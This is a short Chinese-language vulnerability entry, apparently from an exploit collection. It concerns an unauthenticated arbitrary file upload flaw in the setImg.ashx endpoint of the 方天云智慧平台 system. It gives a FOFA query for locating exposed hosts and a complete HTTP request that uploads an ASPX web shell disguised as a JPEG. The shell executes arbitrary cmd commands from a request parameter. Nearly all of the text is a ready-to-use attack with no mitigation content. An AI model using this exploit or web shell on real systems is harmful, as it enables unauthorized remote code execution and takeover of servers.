# 方天云智慧平台系统setImg.ashx存在文件上传漏洞

方天云智慧平台系统 setImg.ashx 接口处存在任意文件上传漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。

## fofa

```java
body="AjaxMethods.asmx/GetCompanyItem"
```

## poc

```java
POST /Data/setImg.ashx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2,
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=----21909179191068471382830692394
Connection: close
 
------21909179191068471382830692394
Content-Disposition: form-data; name="Filedata"; filename="asd.aspx"
Content-Type: image/jpeg
 
<%@ Page Language="Jscript" validateRequest="false" %><%var c=new System.Diagnostics.ProcessStartInfo("cmd");var e=new System.Diagnostics.Process();var out:System.IO.StreamReader,EI:System.IO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=true;e.StartInfo=c;c.Arguments="/c " + Request.Item["cmd"];e.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();Response.Write(out.ReadToEnd() + EI.ReadToEnd());System.IO.File.Delete(Request.PhysicalPath);Response.End();%>
------21909179191068471382830692394--
```

文件路径`http://ip/UploadFile/CustomerFile/回显路径`